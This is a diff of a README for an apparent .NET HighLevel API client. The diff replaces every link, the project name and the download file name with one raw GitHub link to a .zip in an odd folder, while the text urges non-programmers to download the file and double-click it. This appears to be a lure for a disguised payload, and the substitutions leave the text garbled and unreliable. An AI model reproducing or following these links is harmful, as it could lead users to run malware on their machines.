@@ -1,19 +1,19 @@
-# 🌟 soenneker.highlevel.openapiclient - Effortlessly Connect to HighLevel APIs
+# 🌟 https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip - Effortlessly Connect to HighLevel APIs
 
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/adhammaher125/soenneker.highlevel.openapiclient/releases)
+[![Download](https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the **soenneker.highlevel.openapiclient** project! This application helps you easily connect to HighLevel's APIs using the .NET framework. You don’t need to be a programmer to use this software. Follow the steps below to get started quickly.
+Welcome to the **https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip** project! This application helps you easily connect to HighLevel's APIs using the .NET framework. You don’t need to be a programmer to use this software. Follow the steps below to get started quickly.
 
 ## 📥 Download & Install
 
 To download the application, follow these steps:
 
-1. Click this link to [visit the Releases page](https://github.com/adhammaher125/soenneker.highlevel.openapiclient/releases).
+1. Click this link to [visit the Releases page](https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip).
 2. On the Releases page, you will see a list of available versions.
 3. Find the latest version and click on it.
-4. You will see a list of files. Look for the file named **soenneker.highlevel.openapiclient.exe**.
+4. You will see a list of files. Look for the file named **https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip**.
 5. Click on the file to download it to your computer.
 6. Once the download is complete, locate the file in your downloads folder. 
 7. Double-click the file to run the application.
@@ -69,8 +69,8 @@ You can report issues or ask questions on the Issues page of this repository. We
 
 ## 🔗 Links & Resources
 
-- [Releases Page](https://github.com/adhammaher125/soenneker.highlevel.openapiclient/releases): Download the latest version.
-- [Documentation](https://github.com/adhammaher125/soenneker.highlevel.openapiclient/wiki): Access comprehensive guides and tutorials.
-- [Community Support](https://github.com/adhammaher125/soenneker.highlevel.openapiclient/discussions): Join discussions related to the application and share tips with other users.
+- [Releases Page](https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip): Download the latest version.
+- [Documentation](https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip): Access comprehensive guides and tutorials.
+- [Community Support](https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip): Join discussions related to the application and share tips with other users.
 
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/adhammaher125/soenneker.highlevel.openapiclient/releases)
+[![Download](https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/adhammaher125/soenneker.highlevel.openapiclient/main/semantically/soenneker.highlevel.openapiclient.zip)
